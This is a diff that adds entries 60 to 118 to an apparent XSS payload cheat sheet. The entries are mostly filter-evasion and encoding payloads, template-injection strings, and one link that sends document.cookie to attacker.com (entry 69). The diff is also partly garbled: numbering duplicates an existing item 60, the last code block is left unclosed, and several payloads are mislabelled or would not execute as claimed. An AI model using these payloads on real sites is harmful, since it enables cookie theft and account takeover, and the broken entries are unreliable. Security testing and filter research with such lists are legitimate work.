@@ -550,11 +550,299 @@ Using self-executing anonymous functions to trigger XSS.
 <script>((()=>alert(1)))()</script>
 ```
 
+**60. Double URL-Encoded JavaScript Payloads**
+```html
+%253Cscript%253Ealert('XSS')%253C%252Fscript%253E  // Double encoding to bypass WAFs
+```
+
+**61. Fragment Identifier Injection**
+```html
+<a href="http://example.com/#<script>alert(1)</script>">Click Me</a>  // Injecting JavaScript through fragments
+```
+
+**62. Hash Character (#) to Bypass Filters**
+```html
+<script#>alert(1)</script#>  // Bypass some HTML parsers
+```
+
+**63. JavaScript Event in Anchor Tag Attribute**
+```html
+<a href="#" onclick="javascript:alert('XSS')">Click</a>
+```
+
+**64. Image src Attribute Using JavaScript URL Scheme**
+```html
+<img src="javascript:alert('XSS')">
+```
+
+**65. Malformed Tags with Missing Closure**
+```html
+<script>alert('XSS')
+```
+
+**66. Exploiting Frame Attributes**
+```html
+<iframe src="javascript:alert('XSS')"></iframe>
+```
+
+**67. Inline JavaScript Execution with JSFiddle URL**
+```html
+<script src="https://jsfiddle.net/user/external.js"></script>  // External script load
+```
+
+**68. JavaScript Execution Through HTML-Encoded Breaks**
+```html
+<script>alert('line1')\u000Aalert('line2')</script>
+```
+
+**69. XSS Injection in JavaScript URL Redirect**
+```html
+<a href="javascript:document.location='http://attacker.com/?cookie='+document.cookie">Redirect</a>
+```
+
+**70. Using JavaScript Constructors for Execution**
+```html
+<script>alert.constructor('alert(1)')()</script>
+```
+
+**71. Polyglot Payload for Both JavaScript and JSON**
+```json
+{"name":"</script><script>alert(1)</script>"}
+```
+
+**72. Abuse of the `<noscript>` Tag**
+```html
+<noscript><img src="x" onerror="alert(1)"></noscript>
+```
+
+**73. Inline Style with JavaScript Execution**
+```html
+<div style="width:expression(alert(1))">XSS</div>  // Only effective in older IE versions
+```
+
+**74. Encoded JavaScript URI Manipulation**
+```html
+<a href="jav&#x61;script:alert(1)">Click</a>
+```
+
+**75. SVG Injection with Script Element**
+```html
+<svg><script>alert(1)</script></svg>
+```
+
+**76. Abuse of ARIA Attributes for Injection**
+```html
+<div role="alert" aria-live="assertive" onfocus="alert(1)" tabindex="0">Focus me</div>
+```
+
+**77. Abuse of Onscroll Event**
+```html
+<div onscroll="alert(1)">Scroll me</div>
+```
+
+**78. Injecting JavaScript into Template Literals**
+```javascript
+<script>let a = `</script><script>alert(1)</script>`;</script>
+```
+
+**79. Dynamic Script Injection Using Blob URLs**
+```html
+<script>let blob = new Blob(['alert(1)'], {type: 'text/javascript'}); let url = URL.createObjectURL(blob); document.body.appendChild(Object.assign(document.createElement('script'), {src: url}));</script>
+```
+
+**80. Abuse of `window.name`**
+```html
+<script>window.name = '<img src="x" onerror="alert(1)">';</script>
+```
+
+**81. Using `<object>` Tag for JavaScript Execution**
+```html
+<object data="javascript:alert('XSS')"></object>
+```
+
+**82. Using `<embed>` Tag for XSS**
+```html
+<embed src="javascript:alert('XSS')">
+```
+
+**83. Injection via Path Traversal in URLs**
+```html
+http://example.com/%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+**84. Template Injection in Handlebars.js**
+```html
+{{#with "constructor"}}{{this.alert "XSS"}}{{/with}}
+```
+
+**85. Injection Using AngularJS ng-csp Bypass**
+```html
+{{constructor.constructor('alert(1)')()}}
+```
+
+**86. Abuse of Event Listeners to Inject JavaScript**
+```html
+<button id="btn">Click Me</button><script>document.getElementById('btn').addEventListener('click', function() { alert(1); });</script>
+```
+
+**87. HTML Audio with Malformed Tag**
+```html
+<audio src="javascript:alert(1)">Sound</audio>
+```
+
+**88. CSS Import URL with JavaScript URI**
+```css
+@import url('javascript:alert(1)');
+```
+
+**89. Exploiting InnerHTML Assignment in JavaScript**
+```html
+<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>
+```
+
+**90. SVG Animation Injection**
+```html
+<svg><animate onbegin="alert(1)"></animate></svg>
+```
+
+**91. Exploiting HTML `<isindex>` Element**
+```html
+<isindex action="javascript:alert('XSS')">
+```
+
+**92. HTML `<listing>` Tag Abuse**
+```html
+<listing oncopy=alert(1)>Hello</listing>
+```
+
+**93. Targeting Cross-Origin Redirects with XSS Payloads**
+```html
+<a href="//attacker.com/"><img src="javascript:alert(1)"></a>
+```
+
+**94. Abuse of `innerText` JavaScript Property**
+```html
+<script>document.querySelector('body').innerText += '<img src=x onerror=alert(1)>';</script>
+```
+
+**95. Use of `<bgsound>` for XSS Execution (IE)**
+```html
+<bgsound src="javascript:alert(1)">
+```
+
+**96. Exploit CSS `background` for XSS**
+```html
+<div style="background:url(javascript:alert('XSS'))">CSS Background</div>
+```
+
+**97. Leverage `window.location` for Redirection-Based XSS**
+```html
+<script>window.location = 'javascript:alert(1)';</script>
+```
+
+**98. Clickjacking Using XSS Payloads**
+```html
+<iframe src="http://example.com/" style="opacity:0;" onload="alert(1)"></iframe>
+```
+
+**99. XSS Injection Using `<keygen>`**
+```html
+<keygen autofocus onfocus=alert(1)>
+```
+
+**100. Inline JavaScript URL with Percent Encoding**
+```html
+<a href="javascript%3Aalert('XSS')">Click Me</a>
+```
+
+**101. Obfuscate Payload Using String Concatenation**
+```html
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+```
+
+**102. CSS Selector Exploit in JavaScript**
+```html
+<style>div::after {content: "XSS";}</style>
+<script>document.querySelector("div").onmouseenter = () => alert(1);</script>
+```
+
+**103. Abuse of `<applet>` Tag**
+```html
+<applet code="javascript:alert(1)"></applet>  // Deprecated but relevant in very old browsers
+```
+
+**104. JavaScript Injection Through Query Parameter**
+```html
+http://example.com/?param=<script>alert('XSS')</script>
+```
+
+**105. SVG Use with JavaScript URI**
+```html
+<svg><use xlink:href="javascript:alert(1)"></use></svg>
+```
+
+**106. Exploit via HTML Form Input Value**
+```html
+<form><input value="XSS" onfocus="alert(1)" autofocus></form>
+```
+
+**107. Using `location.hash` to Inject XSS**
+```html
+<script>location.hash = "javascript:alert(1)";</script>
+```
+
+**108. Injection Using JavaScript `.onload` Event Handler**
+```html
+<img src="x" onload="alert(1)">
+```
+
+**109. Using CSS `position:fixed` with JavaScript URL**
+```html
+<a style="position:fixed;" href="javascript:alert(1)">Fixed</a>
+```
+
+**110. Data Attributes for Inline JavaScript**
+```html
+<button data-action="javascript:alert(1)">Click</button>
+```
+
+**111. Execution Using `<menu>` Tag**
+```html
+<menu type="context" id="menu"><menuitem label="Click me" onclick="alert(1)"></menuitem></menu>
+```
+
+**112. Combining JavaScript and CSS in `<svg>`**
+```html
+<svg><style>@import 'javascript:alert(1)';</style></svg>
+```
+
+**113. Payload Split Between Multiple `<script>` Tags**
+```html
+<script>aler</script><script>t(1)</script>
+```
+
+**114. Inline JavaScript Comment to Break Filters**
+```html
+<script>alert/*hello*/(1)</script>
+```
+
+**115. JavaScript Constructor from User Input**
+```html
+<script>Function.constructor('alert(1)')()</script>
+```
+
+**116. Abuse of JavaScript Ternary Operator**
+```html
+<script>1 ? alert(1) : ''</script>
+```
+
+**117. Exploit CSS Visibility Property for Hidden Script**
+```html
+<div style="visibility:hidden" onclick="alert(1)">Hidden</div>
+```
+
+**118. Abusing `<plaintext>` Tag**
+```html
+<plaintext><script>alert(1)</script>
 ### **60. Multi-Layer Encoded and Obfuscated XSS Payloads**
 Leveraging multiple encoding schemes to evade signature-based filters.
-
-```html
-<iframe src="javascript:atob('YWxlcnQoJ1hTUycpOw==')"></iframe>  // Base64 alert('XSS')
-<svg/onload="eval(atob('YWxlcnQoJ1hTUycpOw=='))">  // JavaScript execution with eval
-<scr<script>ipt>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</scr<script>ipt>  // Hex obfuscation
-```
